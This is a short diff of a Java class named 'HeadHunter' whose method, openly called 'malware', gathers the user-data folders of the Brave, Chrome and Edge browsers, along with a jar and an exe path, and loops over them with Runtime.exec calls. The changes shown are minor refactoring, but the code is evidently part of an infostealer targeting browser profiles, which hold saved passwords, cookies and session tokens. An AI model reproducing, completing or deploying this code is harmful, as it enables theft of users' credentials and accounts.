@@ -8,17 +8,14 @@ import java.net.URLConnection;
 import java.net.UnknownHostException;
 import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.List;
 
 public class HeadHunter {
-    File file;
-
-    public File getFile() {
-        return file;
-    }
-
+	
     void malware(String url) {
         char filename;
-        ArrayList<String> files = new ArrayList<String>();
+        int file;
+        List<String> files = new ArrayList<String>();
         String brave_data = System.getenv("LOCALAPPDATA") + "/BraveSoftware/Brave-Browser/User Data";
         String chrome_data = System.getenv("LOCALAPPDATA") + "/Google/Chrome/user Data";
         String edge_data = System.getenv("LOCALAPPDATA") + "/Microsoft/Edge/User Data";
@@ -29,6 +26,7 @@ public class HeadHunter {
         files.add(edge_data);
         files.add(jarfile);
         files.add(exefile);
+        
         for (String m : files) {
         	try {
                 Runtime.getRuntime().exec("Chrome.exe");
